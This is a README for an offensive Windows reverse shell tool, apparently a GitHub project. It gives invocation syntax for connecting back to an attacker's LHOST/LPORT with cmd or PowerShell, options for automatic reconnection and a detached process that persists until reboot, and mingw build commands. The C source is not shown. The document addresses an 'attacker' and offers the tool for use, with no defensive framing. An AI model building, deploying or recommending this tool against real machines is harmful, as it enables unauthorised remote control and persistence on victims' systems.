# windows-rev-shell
An advanced windows reverse shell. Allows to specify the type of shell (cmd or powershell), can be programmed to automatically attempt to reconnect and can be spawned as subprocess allowing an attacker to continue 
## Usage
One shot <br>
`shell.exe LHOST LPORT <cmd|powershell> 0` <br>
Attempt to reconnect to the specified IP. The last parameter indicates the number of seconds between attempts <br>
`shell.exe LHOST LPORT <cmd|powershell> ATTEMPT_DELAY` <br>
One shot reverse shell spawned as subprocess to keep the current terminal free. The process is disposed once the attacker closes the connection on his side<br>
`shell.exe LHOST LPORT <cmd|powershell> 0 s` <br>
Spawn a reverse shell subprocess that will periodically attempt to reconnect to the host. The process is indipendent from the original shell and will continue to exist until the machine is rebooted<br>
`shell.exe LHOST LPORT <cmd|powershell> ATTEMPT_DELAY s` <br>
## Building
32 Bit version <br>
`i686-w64-mingw32-gcc windows.c -o shell.exe -lws2_32` <br>
64 Bit version <br>
`x86_64-w64-mingw32-gcc windows.c -o shell.exe -lws2_32` <br>
